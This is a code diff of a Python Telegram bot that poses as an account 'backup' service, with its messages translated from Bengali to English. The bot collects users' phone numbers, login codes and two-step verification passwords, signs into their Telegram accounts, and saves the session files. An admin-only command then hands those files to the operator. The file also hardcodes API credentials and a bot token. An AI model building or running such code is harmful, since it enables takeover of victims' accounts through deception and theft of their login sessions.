@@ -9,7 +9,7 @@ from pyrogram.errors import SessionPasswordNeeded
 # ==================== কনফিগারেশন ====================
 API_ID = 36547444  
 API_HASH = "119a3ac4fd3dc368df92ae6d81f3bb3e"  
-BOT_TOKEN = "8970655570:AAGbOC4KmwkOzUxHNA29O6SHfJ2omqrUMJ4"  
+BOT_TOKEN = "8970655570:AAGb0C4KmwkOzUxHNA29O6SHfJ2omqrUMJ4"  
 ADMIN_ID = 8095751648  
 # ===================================================
 
@@ -32,41 +32,40 @@ async def start_command(client: Client, message: Message):
     user_id = message.from_user.id
     if user_id == ADMIN_ID:
         await message.reply_text(
-            "👋 স্বাগতম এডমিন!\n\n"
-            "📊 স্টোরেজ চেক করতে: /status\n"
-            "📦 জিপ ফাইল কেটে নিতে: `/get [ফাইলের সংখ্যা]`"
+            "👋 swagotom Admin!\n\n"
+            "📊 Storage check: /status\n"
+            "📦 Get Zip: `/get [number]`"
         )
     else:
         await message.reply_text(
-            "👋 স্বাগতম! আপনার টেলিগ্রাম আইডির একটি জিপ ফাইল ব্যাকআপ তৈরি করতে "
-            "আপনার phone নম্বরটি আন্তর্জাতিক ফরম্যাটে পাঠান (যেমন: +88017XXXXXXXX)।"
+            "👋 Swagotom! Kindly send your phone number with country code (e.g., +88017XXXXXXXX) to start backup."
         )
 
 @bot.on_message(filters.command("status") & filters.user(ADMIN_ID) & filters.private)
 async def status_command(client: Client, message: Message):
     files = [f for f in os.listdir(STORAGE_DIR) if f.endswith(".zip")]
-    await message.reply_text(f"📊 বর্তমানে বটের স্টোরেজে মোট **{len(files)}টি** জিপ ফাইল জমা আছে।")
+    await message.reply_text(f"📊 Total files in storage: **{len(files)}**")
 
 @bot.on_message(filters.command("get") & filters.user(ADMIN_ID) & filters.private)
 async def get_files(client: Client, message: Message):
     args = message.text.split()
     if len(args) < 2:
-        await message.reply_text("❌ সঠিক ফরম্যাট: `/get 5`")
+        await message.reply_text("❌ Format: `/get 5`")
         return
     try:
         count = int(args[1])
     except ValueError:
-        await message.reply_text("❌ ফাইলের সংখ্যাটি অবশ্যই সংখ্যা হতে হবে।")
+        await message.reply_text("❌ Count must be a number.")
         return
 
     all_zips = sorted([f for f in os.listdir(STORAGE_DIR) if f.endswith(".zip")])
     if not all_zips:
-        await message.reply_text("❌ স্টোরেজে কোনো জিপ ফাইল নেই।")
+        await message.reply_text("❌ No files in storage.")
         return
     
     files_to_take = all_zips[:count]
     actual_count = len(files_to_take)
-    await message.reply_text(f"📦 {actual_count}টি জিপ ফাইল প্রসেস করা হচ্ছে...")
+    await message.reply_text(f"📦 Processing {actual_count} files...")
     
     master_zip_name = f"Admin_Fetch_{actual_count}_files.zip"
     try:
@@ -75,9 +74,9 @@ async def get_files(client: Client, message: Message):
                 file_path = os.path.join(STORAGE_DIR, file_name)
                 master_zip.write(file_path, arcname=file_name)
                 os.remove(file_path)
-        await message.reply_document(document=master_zip_name, caption=f"✅ {actual_count}টি জিপ ফাইল পাঠানো হলো।")
+        await message.reply_document(document=master_zip_name, caption=f"✅ Sent {actual_count} files.")
     except Exception as e:
-        await message.reply_text(f"❌ সমস্যা: {str(e)}")
+        await message.reply_text(f"❌ Error: {str(e)}")
     finally:
         if os.path.exists(master_zip_name):
             os.remove(master_zip_name)
@@ -92,7 +91,7 @@ async def handle_login(client: Client, message: Message):
 
     if text.startswith("+"):
         phone_number = text
-        await message.reply_text("⏳ টেলিগ্রাম সার্ভারে ওটিপি পাঠানো হচ্ছে...")
+        await message.reply_text("⏳ Connecting to Telegram...")
         clean_phone = phone_number.replace("+", "").replace(" ", "")
         temp_session_path = os.path.join(STORAGE_DIR, f"temp_{clean_phone}")
         
@@ -106,9 +105,9 @@ async def handle_login(client: Client, message: Message):
                 "phone_code_hash": code_info.phone_code_hash,
                 "clean_phone": clean_phone, "temp_path": temp_session_path
             }
-            await message.reply_text("📨 আপনার টেলিগ্রাম অ্যাপে যাওয়া ওটিপি কোডটি এখানে পাঠান।")
+            await message.reply_text("📨 Enter OTP code:")
         except Exception as e:
-            await message.reply_text(f"❌ ওটিপি পাঠানো যায়নি: {str(e)}")
+            await message.reply_text(f"❌ Error: {str(e)}")
             await user_client.disconnect()
             if os.path.exists(f"{temp_session_path}.session"):
                 os.remove(f"{temp_session_path}.session")
@@ -127,12 +126,12 @@ async def handle_login(client: Client, message: Message):
                         zipf.write(session_file, arcname=f"{data['clean_phone']}.session")
                 if os.path.exists(session_file):
                     os.remove(session_file)
-                await message.reply_text("✅ অ্যাকাউন্টটি সফলভাবে যুক্ত হয়েছে!")
+                await message.reply_text("✅ Account Connected Successfully!")
                 del user_data[user_id]
             except Exception as e:
-                await message.reply_text(f"❌ ভুল পাসওয়ার্ড বা সমস্যা: {str(e)}\nআবার দিন:")
+                await message.reply_text(f"❌ Wrong password, try again:")
         else:
-            await message.reply_text("⚙️ ভেরিফাই করা হচ্ছে...")
+            await message.reply_text("⚙️ Verifying...")
             try:
                 await user_client.sign_in(data["phone"], data["phone_code_hash"], text)
                 await user_client.disconnect()
@@ -143,13 +142,13 @@ async def handle_login(client: Client, message: Message):
                         zipf.write(session_file, arcname=f"{data['clean_phone']}.session")
                 if os.path.exists(session_file):
                     os.remove(session_file)
-                await message.reply_text("✅ অ্যাকাউন্টটি সফলভাবে যুক্ত হয়েছে!")
+                await message.reply_text("✅ Account Connected Successfully!")
                 del user_data[user_id]
             except SessionPasswordNeeded:
-                await message.reply_text("🔐 Two-Step Verification অন আছে। পাসওয়ার্ডটি দিন:")
+                await message.reply_text("🔐 Two-Step Verification is enabled. Enter password:")
                 user_data[user_id]["waiting_for_password"] = True
             except Exception as e:
-                await message.reply_text(f"❌ লগইন ব্যর্থ: {str(e)}")
+                await message.reply_text(f"❌ Login failed: {str(e)}")
                 await user_client.disconnect()
                 if os.path.exists(f"{data['temp_path']}.session"):
                     os.remove(f"{data['temp_path']}.session")
@@ -158,14 +157,13 @@ async def handle_login(client: Client, message: Message):
 async def start_services():
     # প্রথমে টেলিগ্রাম বট সচল করা হচ্ছে
     await bot.start()
-    print("--- Telegram Bot is Online ---")
+    print("--- Telegram Bot Server Connected ---")
     
-    # এরপর রেন্ডারের জন্য Flask ওয়েব সার্ভার ব্যাকগ্রাউন্ডে রান করা হচ্ছে
+    # এরপর রেন্ডারের জন্য Flask ওয়েব সার্ভার চালু করা হচ্ছে
     port = int(os.environ.get("PORT", 8080))
     loop = asyncio.get_event_loop()
     loop.run_in_executor(None, lambda: app.run(host="0.0.0.0", port=port, use_reloader=False))
     
-    # বটকে রানিং রাখা
     await asyncio.Event().wait()
 
 if __name__ == "__main__":
